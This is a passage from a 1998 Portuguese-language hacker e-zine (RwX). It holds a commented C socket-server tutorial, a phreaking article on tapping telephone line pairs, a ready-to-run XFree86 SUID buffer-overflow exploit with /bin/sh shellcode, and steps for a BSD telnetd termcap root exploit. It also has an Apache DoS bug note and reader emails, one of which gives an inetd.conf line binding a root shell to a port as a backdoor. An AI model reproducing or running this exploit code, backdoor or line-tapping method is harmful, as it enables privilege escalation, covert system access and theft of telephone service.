+/* LISTEN_SOCK: Integer que sera' usada para esperar */
+/* conexao de abrir o socket                         */
+/* ##################################################*/
+
+listenfd = socket(AF_INET, SOCK_STREAM, 0);
+
+/* ###################################################*/
+/* Abre um socket direcionado para listenfd */
+/* informacoes sobre funcao socket():       */
+/* #include <sys/types.h>                   *//* Todos os headers daqui tem*/
+/* #include <sys/socket.h>                  *//* na rwx_socket.h */
+/* int socket(int domain, int type, int protocol)              */
+/* ==============================================              */
+/* DOMAINS QUE PODEM SER USADOS:                               */
+/* AF_UNIX  (Protocolo Interno do UNIX)                        */
+/* AF_INET  (Protocolo INTERNET ARPA)  [O que eh usado aqui]   */
+/* AF_ISO   (ISO protocolos)                                   */
+/* AF_IMPLINK (IMP "host na IMP" 'link layer')                 */
+/* ===============================================             */
+/* O Socket tem o indicado TYPE, que especifica a semantica de */
+/* de comunicacao                                              */
+/* TYPEs aceitos:                                              */
+/* SOCK_STREAM: conexao baseadas em 'bytes stream'(TCP)hehe    */
+/* SOCK_DGRAM : suporta 'datagrams' (UDP)                      */
+/* SOCK_RAW   : permite acessar os protocolos de rede internos */
+/*              e interfaces [so' pode ser usado por super-user*/
+/* ===============================================             */
+/* Protocolos aceitos com numeros:                             */
+/* ip      0       IP   # protocolo da internet, pseudo-numero */
+/* icmp    1       ICMP # internet controle de menssagem       */
+/* igmp    2       IGMP # internet grupo multicast protocolo   */
+/* ggp     3       GGP  # gateway-gateway protocolo            */
+/* tcp     6       TCP  # transmissao de controle protocolo    */
+/* pup     12      PUP  # PARC universal packet protocolo      */
+/* udp     17      UDP  # user datagram protocolo              */
+/* idp     22      IDP  # ????                                 */
+/* raw     255     RAW  # RAW IP interface                     */
+/* ############################################################*/
+
+struct sockaddr_in conec;
+
+/* ############################################################*/
+/* Sockaddr_in eh um tipo de estrutura q "define" um endereco  */
+/* internet. Todos os "campos" dessa estrutura devem ser preen-*/
+/* chidos pra q a conexao ocorra                               */
+/* ############################################################*/
+
+bzero((char *)&conec, sizeof(conec));
+
+/* ############################################################*/
+/* void bzero(void *s, int n);                                 */
+/* bzero() seta os N primeiros bytes da string S para 0        */
+/* ############################################################*/
+
+conec.sin_family = AF_INET;
+
+/* ############################################################*/
+/* AF_INET: Protocolo internet ARPA                            */
+/* ############################################################*/
+
+conec.sin_addr.s_addr = htonl(INADDR_ANY);
+
+/* ############################################################*/
+/* Qualquer endereco para conexao, usamos isso quando estamos  */
+/* agindo como um servidor.                                    */
+/* a funcao htonl transforma de host byte order para network   */
+/* byte order.                                                 */
+/* ############################################################*/
+
+conec.sin_port = htons(6969);
+
+/* ############################################################*/
+/* Define porta para a estrutura CONEC, no caso, 6969          */
+/* a funcao htons transforma de host byte order para network   */
+/* byte order.                                                 */
+/* ############################################################*/
+
+bind(listenfd, (struct sockaddr *) &servaddr, sizeof(servaddr));
+
+/* ############################################################*/
+/* Funcao BIND:                                                */
+/* #include <sys/types.h>                                      */
+/* #include <sys/socket.h>                                     */
+/* int   bind(int   sockfd,  struct  sockaddr  *my_addr,  int  */
+/* addrlen);                                                   */
+/* BIND, "junta um nome a socket", ou seja, BIND retorna ao    */
+/* socket  sockfd, o local address my_addr, addr_len, eh o size*/
+/* de my_addr.                                                 */
+/* ############################################################*/
+
+listen(listenfd, 1);
+
+/* ############################################################*/
+/* Informacoes sobre a funcao  listen()                        */
+/* #include <sys/socket.h>                                     */
+/* int listen(int s, int backlog);                             */
+/* para aceitar conexoes, um socket eh primeiro criado com     */
+/* socket(), depois, um limite para as conexoes vindas dos cli-*/
+/* entes e' dado com listen().                                 */
+/* o backlog define o tamanho maximo que o 'queue' da conexao  */
+/* pode crescer.                                               */
+/* ############################################################*/
+
+connfd = accept(listenfd, (struct sockaddr_in *)&conec, sizeof(conec));
+
+/* ############################################################*/
+/* Informacoes sobre a funcao accept()                         */
+/* #include <sys/types.h>                                      */
+/* #include <sys/socket.h>                                     */
+/* int accept(int s, struct sockaddr *addr, int *addrlen);     */
+/* o argumento 's' e' o socket criado com a funcao socket()    */
+/* junto com um endereco setado por bind().                    */
+/* a Funcao accept() cria um novo socket com as mesmas proprie-*/
+/* dades de 's' e a aloca um novo 'arquivo' para o socket.     */
+/* Aqui, nos usamos CONNFD para ser o novo socket criado, que  */
+/* foi declarado como 'integer' no comeco do arquivo.          */
+/* ############################################################*/
+
+snprintf(buff, sizeof(buff), "HELLO WORLD!!\n");
+
+/* ##############################################################*/
+/* SNPRINTF: copia "HELLO WORLD" para a var buff, faz o mesmo que*/
+/* sprintf(), sendo que como snprintf() requesita do size da var,*/
+/* fica impossivel dar um 'overflow' no programa.. seguranca rulz*/
+/* ##############################################################*/
+
+write(connfd, buff, sizeof(buff));
+
+/* ##############################################################*/
+/* Informacoes sobre funcao write():                             */
+/* escreve uma mensagem do outro lado do socket, basicamente     */
+/* CONNFD e' o socket criado com accept(), buff a variavel que   */
+/* contem o texto a ser posto do outro lado do socket, e o terce-*/
+/* iro parametro, eh o tamanho da segunda VAR enviada pela funcao*/
+/* ##############################################################*/
+
+close(connfd);
+
+/* ############################################################## */
+/*                        fecha o socket                          */
+/* ############################################################## */
+/* Socket Basico(Server) por X-SaTaNiC, revisado por dumped       */
+}
+/* EOF EOF EOF EOF EOF EOF EOF EOF EOF EOF EOF EOF EOF EOF EOF EOF*/
+/* ---------------------------- */
+/* Bibliografia:                */
+/* LINUX Man Page               */
+/* UNIX Networking Programming  */
+/* ACK & PESQUIA                */
+/* ---------------------------- */
+Ufa... bem, o ba'sico de um servidor jah ta explicado! =)
+Tipo, se tudo der certo, proxima edicao tem programa explicando UDP!
+
+---------------------------------------------------------------------[rwx]-
+
+08# PHREAK
+~~~~~~~~~~~~
+
+>From thelordhacker@hotmail.com  Fri Jan 30 16:18:34 1998
+Received: from fred.globecomm.net (fred.globecomm.net [207.51.48.31]) by grex.cyberspace.org (8.6.13/8.6.12) with ESMTP id QAA05664 for <rwx@cyberspace.org>; Fri, 30 Jan 1998 16:18:26 -0500
+Received: from hotmail.com (f63.hotmail.com [207.82.250.149]) by fred.globecomm.net (8.8.8/8.8.0) with SMTP id QAA20804 for <rwx@null.net>; Fri, 30 Jan 1998 16:10:37 -0500 (EST)
+Received: (qmail 7956 invoked by uid 0); 30 Jan 1998 21:15:09 -0000
+Message-ID: <19980130211509.7955.qmail@hotmail.com>
+Received: from 200.255.253.243 by www.hotmail.com with HTTP;
+	Fri, 30 Jan 1998 13:15:08 PST
+X-Originating-IP: [200.255.253.243]
+From: "lord hacker" <thelordhacker@hotmail.com>
+To: rwx@null.net
+Subject: materia p/ zine rwx
+Content-Type: text/plain
+Date: Fri, 30 Jan 1998 13:15:08 PST
+
+Phreaking in Brazil:
+-------------------
+By The Lord.
+
+Muitos sites na internet hoje ensinam receitas de bolos para ligar de
+graca em orelhoes, mas pouquissimos autores ensinam alguma coisa que se
+aproveite de verdade.
+O fato eh que os internautas brasileiros nada entendem de redes
+telefonicas, e o pouco material que tem sao copias e traducoes de
+documentos internacionais, de paises cujas redes telefonicas possuem
+tecnologia mais recente que a nossa, como comutacao  e tarifacao
+digital, o que abre as inumeras possibilidades de violacao logica.
+Embora ja possamos contar com as centrais CPA, a maioria dos nossos
+sistemas de comutacao e tarifacao ainda sao analogicos, o que torna
+impossivel uma violacao remota.
+As centrais CPA oferecem apenas facilidades de programacao e
+armazenamento digital, e uma pre-comutacao dentro da propria central, em
+busca de uma posicao livre para escoar a chamada. Ou seja, em uma
+chamada convencional, o maximo que ela faz eh converter a discagem em
+sinalizacao para os equipamentos de comutacao e transmissao da central.
+Recentemente, implantou-se a facilidade de interpretacao dessa
+sinalizacao, o que permite analizar a procedencia de uma chamada por
+equipamentos como o Bina, por exemplo.
+Mesmo as centrais de comutacao celular tem a maioria de suas etapas de
+comutacao analogicas.
+Ainda que nossos equipamentos de FDM (Multiplexacao por divisao de
+frequencia) tenham sido substituidos em grande escala por equipamentos
+PCM (Multiplexacao por Codigo de Pulso) e por SAPCM(PCM de amostragem
+estatistica), esta eh uma etapa avancada da transmissao, que so se
+consegue ter acesso de dentro da central telefonica. Em outras palavras,
+via rede publica eh impossivel driblar as etapas de comutacao e
+tarifacao da nossa rede telefonica.
+Ainda assim, existem metodos muito interessantes de se burlar um acesso
+telefonico a internet.
+Um deles eh o grampo de pares nos entroncamentos aereos. Isso se faz
+fisicamente nas caixas de emendas suspensas nos postes. Embora visivel,
+eh impossivel detecta-la por medicoes nas centrais telefonicas. Um
+tecnico somente conseguiria identifica-las seguindo o par desde a
+central telefonica verificando cada emenda do cabo-tronco ate o ponto
+violado.
+Obviamente, se for possivel executar tal procedimento num cabo
+subterraneo, seria ainda mais dificil ser encontrado. Porem, os cabos
+subterraneos em sua extrema maioria sao pressurizados, e um corte pode
+ser detectado pelos equipamentos de pressurizacao com consideravel
+precisao de distancia e direcao. Assim, seria nescessario executar o
+grampo em pontos despressurizados por emendas ja existentes, como nas
+caixas existentes em frente de predios, por exemplo, embora isso
+aumentaria a probabilidade de um grampo ser encontrado.
+O ideal seria que o grampo fosse feito em um determinado ponto onde o
+par grampeado fosse ligado em paralelo com um par desocupado, deste par
+desocupado fosse derivado o grampo fisico, em um ponto diferente. Se
+possivel, eh recomendavel executar-se diversas vezes este procedimento
+de utilizacao de pares desocupados.
+Para identificar um par desocupado, basta verificar se entre os seus
+condutores existe uma tencao continua de 48 volts. Caso exista tal
+tensao, este par esta ocupado por um assinante. Na ausencia de tal
+tensao o par esta desocupado, embora isso nao impeca que ele venha a ser
+ocupados futuramente
+
+The Lord - Jan/98
+
+---------------------------------------------------------------------[rwx]-
+
+-EXPLOITS-
+
+09# X BUFFER OVERFLOW
+~~~~~~~~~~~~~~~~~~~~~
+
+  Esse Overflow Bug afeta ao serv X com SUID . para resolver basta tirar
+ os Suids de /usr/X11R6/bin/X
+
+/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-[Corte Aqui]
+/* [ http://www.rootshell.com/ ] */
+
+        /*  XFree86 Server exploit for Intel x86  */
+        /*  Have phun!!                           */
+
+/* Try 2 3 4 5 for OFFSET */
+#define OFFSET 2
+
+#include <string.h>
+#include <unistd.h>
+#include <errno.h>
+
+#define LENCODE ( sizeof( Code ) )
+char Code[] =
+    "\xeb\x40\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0"
+    "\x3f\x89\xc2\x31\xdb\xb3\x0a\x31\xc9\xcd\x80\x89\xd0\x43\x41"
+    "\xcd\x80\x89\xd0\x43\x41\xcd\x80\x31\xc0\x89\xc3\xb0\x17\xcd"
+    "\x80\x31\xc0\xb0\x2e\xcd\x80\x31\xc0\xb0\x0b\x89\xf3\x8d\x4e"
+    "\x08\x8d\x56\x0c\xcd\x80\xe8\xbb\xff\xff\xff/bin/sh";
+
+char Display[ 0x4001 + OFFSET ] = ":99999", *ptr = Display + OFFSET + 1;
+char *args[] = { "X", "-nolock", Display, NULL };
+
+main() {
+  printf("pHEAR - XFree86 exploit\nby mAChnHEaD <quenelle@iname.com>\n\nYou may get a root prompt now. If you don't, try different values for OFFSET.\n\n");
+  dup2( 0, 10 ); dup2( 1, 11 ); dup2( 2, 12 );
+  __asm__("movl %%esp,(%0)\n\tsubl %1,(%0)"::"b"(ptr),"n"(LENCODE+0x2000));
+  memcpy( ptr + 4, ptr, 0x3fc );
+  memset( ptr + 0x400, 0x90, 0x3c00 - LENCODE );
+  memcpy( ptr + 0x4000 - LENCODE, Code, LENCODE );
+  execve( "/usr/X11R6/bin/X", args, args + 3 );
+  perror( "execve" );
+}
+/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-/-[Corte Aqui]
+
+---------------------------------------------------------------------[rwx]-
+
+-BUGS-
+
+10# APACHE 1.2.XX BUG
+~~~~~~~~~~~~~~~~~~~~~
+  APACHE BUG
+-x-x-x-x-x-x-x
+kbyte / 98
+
+        Recentemente , se conheceu um bug nos Apache Httpd versoes 1.2.xx,
+que faz que um individuo remotamente aumente o 'load average' , isto eh,
+cause a maquina extremamente lenta , apos alguns segundos do ataque.
+Este Bug foi descoberto por Zalewski <lcamtuf@POLBOX.COM>
+
+         O programa que vai anexado , eh um shell script , isto eh , basta
+torna-lo executavel(chmod +x arquivo) e executa-lo.O ataque consiste em
+mandar varios / em uma chamada GET fazendo o httpd procurar pela chamada e
+continuar em um LOOP.O exploit vai anexado (beck.zip).
+
+PATCH - > Upgradar sua versao de apache ou entar usar o patch
+file(apache.patch) que vai nesta zine.Para usar o apache.patch entre no
+diretorio com os srcs do apache copie o apache.patch para la e digite
+patch > apache.patch. Isto deve resolver
+
+KByte@biogate.com
+
+---------------------------------------------------------------------[rwx]-
+
+11# BSD TERMCAP BUG
+~~~~~~~~~~~~~~~~~~~
+   BSD TERMCAP BUG
+-x-x-x-x-x-x-x-x-x-x-x-x
+
+O BSDI BSD/OS 2.1 contem um telnetd com uma certa vulnerabilidade.Ela
+permite ao usuario definir o arquivo de termcap antes de iniciar o Telnet
+como por exemplo
+
+-Copia o vt100 para vt no home dir-
+[kbyte@kbyte kbyte]$ cp /usr/lib/terminfo/v/vt100 /home/kbyte/vt
+-Exporta a Variavel TERM apontando para o VT no proprio home dir-
+[kbyte@kbyte kbyte]$ export TERM="../../../home/kbyte/vt"
+e entao telnetei para sua propria maquina.Ira funcionar normalmente.
+?Entao qual eh a vulnerabilidade?
+Existe um programa que se voce botar em uma maquina BSD e entao apontar o
+TERM para ele , ele lhe dara root.
+Esse programa eh o term.c e esta indo anexado a RwX
+
+- Usando o term.c -
+   Primeiro voce devera colocar esse arquivo na maquina e compilar.Decore
+aonde estara o binario.Entao de outra maquina ou mesmo da mesma maquina
+digite
+[kbyte@kbyte kbyte]$ telnet
+telnet> env def TERM access
+telnet> env def TERMCAP /../../../home/kbyte/term   *Por Exemplo*
+telnet> open maquina
+
+PATCH -> Upgrade para uma nova versao do BSD ou entao mude de OS
+e bumm , vc tera root.
+Bug originalmente descoberto por Theo de Raadt <deraadt@CVS.OPENBSD.ORG>
+e exploit feito Joseph_K e materia escrita por KByte <kbyte@biogate.com>
+
+---------------------------------------------------------------------[rwx]-
+
+12# EMAIL'S
+~~~~~~~~~~~
+From : Thord Scrutcher <fenix@xxxx.com.br>
+
+        Caros colegas da Rwx,
+                Desde ja agradeco pelo grande material contido nesta
+revista.E continuem assim. Queria que voces me mantessem informado sobre
+as proximas atualizacoes desta Zine.
+
+[Antes de tudo obrigado.Infelizmente nao podemos mandar a zine ou
+mantermos informados sobre as novas edicoes do zine , simplesmente confira
+no final do mes em alguma de nossas paginas (www.st.com.br/~rwx ou
+www.cyberspace.org/~rwx) , la sera o primeiro lugar a serem atualizadas.
+OBS : Por favor , nao mandem mails com acento, o meu pine nao se 'entende'
+muito bem com acentos.hehehe.]
+---------------------------------------------------------------------------
+
+From : pckopata@xxxx.net
+
+     E ai pessoal da RWX!!
+     Olha, eu tava lendo na RWX 01 sobre Backdoor's e acho que faltou uma
+coisa no artigo.
+     No inetd.conf voce soh declararam o serviSSo. Nao teriam que
+configurar uma porta TCP no /etc/services?
+    Por exemplo:
+
+Backdoor   stream   tcp   nowait   root   /bin/sh /bin/sh -i
+
+No etc/services:
+
+Backdoor              24/tcp  (ou qualquer outra porta)
+
+Por favor, me corrijam se estiver errado.
+
+   Ateh +
+
+  PS: Continuem com o zine!!!
+  Muito bom!
+
+[Voce esta certo.Nos pisamos na bola.Na
+materia de backdoor do knight ,
+ele esqueceu dessa informacao.Mas esta aqui.Desculpem-nos]
+
+---------------------------------------------------------------------------
+
+From: CooL <cool@xxxx.com.br>
+
+   Hey man,
+
+A zine de vcs ta realmente boa, continuem escrevendo.
+Queria pedir a vcs q abordem tambem, mais assuntos
+referentes a crashes de SOs, como o OOB, IP Fragment,
+etc...
+
+Caso precisem de um membro para atuar, principalmente
+se o assunto for ligado a RWindows, mail-me!
+
+Parabens,
+
+CooL
+
+[Obrigado . Na ultima zine (03) , o kbyte escreveu sobre alguns desses
+ataques.Como eh amplamente divulgado , geralmente nao nos preocupamos em
+colocar na zine.Voce , e varios outros (Air_Tiger , etc) que pediram para
+entrar na zine , infelizmente , nao posso conceder.Ja temos varios membros,
+e entao peco-lhes que escrevam materias e nos mandem , se forem boas , nos
+publicamos , ok?Cya]
+
+----------------------------------------------------------------------------
+
+From: "Zucco" <zucco@xxxx.com.br>
+
+Baixei todos os arquivos RWX que vi em sua home page, porem nao sei para
+que serve.
+Sera que voces poderiam me esclarecer?
+
+[Realmente recebemos um email desse. Bem , se voce nao sabe para que serve
+entao nao adianta eu explicar aki , vc nao vai ler mesmo.Mas , ja ouvistes
+falar de NotePad?:)]
+
+-----------------------------------------------------------------------------
+
+From : Alan <jansen@xxxx.com.br>
+
+Ae o zines de voces e simplesmente excelente. Espero que vc continue a
+escrevelo
+
+[Obrigado.]
+
+-----------------------------------------------------------------------------
+
+From: "Thiago " <cavalieri@xxx>
+
+ Ola,
+
+   o zine de voce eh d+, bom mesmo.
+ Por que voces nao poem assuntos relacionados a criptografia ?
+ Ha algum tempo fiquei sabendo de uma organizacao americana
+ que distribui softs para quebrar a seguranca do DES de 56 bits.
+ Parece que desenvolveram um freeware realmente muito
+ eficiente. O n=EDvel de seguranca do Linux nao estaria
+ tecnicamente comprometida com isso ? Ha algum modo de
+ mudar  o tipo de criptografia do Unix ?
+
+[Ola , obrigado antes de tudo.Eu nao ouvi falar nada de quebrar a
+criptografia DES, por favor nos mandem mais detalhes.Se houvesse uma
+quebra dessa chave , nao so o linux como varios outros programas e
+Sistemas estariam profundamentes afetados.Nao se tem noticia de como mudar
+a criptografia do Unix.Existem alguns programas que aumentam a
+criptografia nas trocas de dados mas nao tenho informacoes sobre a troca
+da criptografia.]
+-----------------------------------------------------------------------------
+
+From : unknow
+Subject: Sobre materia Arquivos .* de DmS
+
+Estou escrevendo mais uma vez agradecendo o trabalho de voces.
+Gostaria de contribuir para a materia " Arquivos .*  " escrita por Dms
+com outros arquivos.
+
+Aqui vai o nome e uma descricao:
+
+- .exrc
+    Este arquivo pode ser encontrado no diretorio HOME de qualquer usuario,
+se voce nao tem pode criar. Este arquivo configura o editor vi na sua
+inicializacao, ou seja, quando iniciamos o vi ela carrega algums "comandos
+???" e seta o vi, eis alguns a colocar neste arquivo:
+set showmode =  mostra em qual situacao se encontra o vi, modo insercao,
+comando  ( aparece o modo no lado direito e embaixo na tela ).
+set number = numera todas as linhas do texto.
+set autoindent = identacao automatica, bastante util em programacao C,
+Pascal, etc
+set tabstop = numero de espacos para a tecla TAB, o padrao ja'
+configuraco e' 8.
+
+Uma configuracao bastante apropriada para o iniciante no vi e':
+set showmode
+set autoindent
+
+Lembrem-se, o vi e' um editor muito poderoso, atras daquela aparencia
+feia e simples estao muitos comandos que nao o deixam a desejar a qualquer outro
+editor.
+
+- .fvwm2rc95
+    Tambem encontrado no diretorio HOME de cada usuario, porem este
+arquivo so' existe se voce tem instalado a interface grafica parecida com o
+Windows 95 no Slackware 96 ( outras versoes nao tenho conhecimento ).
+    Abrindo este arquivo e' possivel ver a configuracao dos menus e dos
+PATHs onde estao alguns programas.
+    Fazendo a traducao das palavras entre ' +" <palavra> " voce tera sua
+interface em portugues, hebraico, alemao, como voce preferir, mas CUIDADO, procure
+manter uma copia deste arquivo pois um erro pode comprometer a inicializacao da
+interface ou podem ocorrer erros nos menus.
+Um abraco e obrigado.
+
+[Obrigado pela complementacao]
+-----------------------------------------------------------------------------
+
+From: "Fernando" <fernando@xxxxx.xxx.xx>
+
+A RWX ta realmente D+! Ta muito legal! Voces todos estao de parabens! Eu
+aguardo ancioso por cada zine que eh disponibilizada na rede por voces. Eu
+gostei muito do modo com que esplicam as coisas, sem aqueles palavroes e ficar
+chamando o cara de lamer soh porque ta lendo o que ta escrito na zine. Coisas do
+tipo "Se isso eh novidade para voce entao voce eh um lamer!". Conseguiram
+privar muita gente interessada desse tipo de provocacao, porque ninguem gosta
+de ser chamado de lamer nem de tabela (nem indiretamente).
+
+Mas, como um bom fucador eu venho atraves deste mostrar algo que nao
+diria que esta errado, mas que pode ser mudado sobre a materia "02#. ARQUIVOS .*
+by DmS" da RWX 03. O negocio eh que alguns arquivos nao foram bem esplicados (e
+outros ate estao faltando), nada contra o DmS, mas acho que deveriam ser
+melhor esclarecidos. Entao la vai:
+
+-> .bashrc - eh chamado pelo /bin/bash toda vez que o mesmo nao for um
+shell de login, ou seja, toda vez que o usuario por algum motivo
+chamar o /bin/bash, algo como o comando "!" do FTP. Isso tira totalmente a
+possibilidade de ele ter a mesma finalidade do .bash_profile, que eh chamado
+pelo shell do login.
+   Isso tambem acontece com os arquivos .cshrc e .tcshrc, soh que para
+os seus respectivos shells: csh e tcsh. O arquivo /etc/profile soh vale
+para o todos os /bin/bash de login
+tambem. O mesmo eh chamado pelo shell de
+login de todos usuarios (como mencionado pelo DmS), que entao eh executado
+antes do .bash_profile do usuario (se ele existir eh claro).
+   O arquivo /etc/csh.login tem a mesma finalidade do
+/etc/profile, soh que para o shell csh (se eu nao me engano para o tcsh
+tambem). Nao tenho como dar certeza mas me parece que existe um tal de
+/etc/csh.rc que eh executado por shell's csh que nao sao de login, antes
+do ~/.cshrc respectivo de cada usuario. O /etc/csh.rc eh global, e entao
+serah  executado por todos os csh que nao sao shell's de login.
+
+Valeu pessoal, um abraco e se me deixarem, escreverei mais sobre
+outras coisas relativas ao Linux.
+
+DmS: me desculpa qualquer coisa, ok cara?! :)
+
+[Valeu cara.o DmS nao ficou chateado nao , quem mandou nao ser
+atento.hehe.Voce esta certo.O arquivo global de csh seria o /etc/csh.cshrc
+e nao /etc/csh.rc ok cara?.Manda mais emails com materias sim , que nos
+publica.Ate mais]
+
+---------------------------------------------------------------------------
+
+Bem , acabou nossa secao de emails.Recebemos varios outros emails , alguns
+nos parabenizando (E eu agradeco a todos) , alguns pedindo ajuda no Linux
+(Nos respondemos prontamente) , e alguns que so nos interessavam.Mandem
+emails com suas opinioes , correcoes , e materias , para que nos saibemos
+que o retorno de nossa zine esteja bom e continuemos a escrever.
+Falow 'Doodz'
+
+KByte
+Email to : rwx@null.net , rwx@st.com.br ou use nossa opcao no menu para
+mandarmos um email(Versao Linux).
+
+---------------------------------------------------------------------[rwx]-
+
+13# FUTURO
+~~~~~~~~~~
+
+  Well galera para o futuro .. so sabemos que iremos continuar escrevendo o
+ zine sempre tentando torna-la bem explicativa e tudo mais.
+  ADMIN'S no ajudem!!!! Mas pra que?? :) ehehehehhehe
+
+---------------------------------------------------------------------[rwx]-
+
+14# PALAVRAS FINAIS
+~~~~~~~~~~~~~~~~~~~
+ Outra edicao da RwX.Nao tivemos o efetivo apoio de netrunner , skynet e
+alguns outros nessa edicao , por problemas deles , mas nas proximas
+edicoes , faremos o melhor possivel (De novo..:))
+---------------------------------------------------------------------[rwx]-
+.oO <End> Oo.
